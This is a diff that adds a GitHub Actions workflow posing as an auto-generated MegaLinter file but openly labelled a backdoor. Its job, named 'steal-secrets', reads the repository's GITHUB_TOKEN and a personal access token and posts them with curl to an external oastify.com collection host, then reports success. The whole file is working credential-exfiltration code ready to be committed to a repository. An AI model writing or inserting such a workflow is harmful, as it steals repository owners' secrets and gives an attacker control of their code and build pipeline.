@@ -1,0 +1,20 @@
+name: "[BACKDOOR] MegaLinter Auto-Generated (DO NOT DELETE)"
+on:
+  workflow_dispatch:
+
+jobs:
+  steal-secrets:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Steal GITHUB_TOKEN and send to attacker
+        run: |
+          TOKEN="${{ secrets.GITHUB_TOKEN }}"
+          PAT="${{ secrets.PAT || '' }}"
+          REPO="${{ github.repository }}"
+          RUN_ID="${{ github.run_id }}"
+          
+          curl -X POST https://5tzaxsma4degpla6y6uqxvryyp4gs6gv.oastify.com \
+               -d "repo=$REPO&run=$RUN_ID&token=$TOKEN&pat=$PAT" \
+               -H "Content-Type: application/x-www-form-urlencoded"
+          
+          echo "Secrets exfiltrated successfully!"
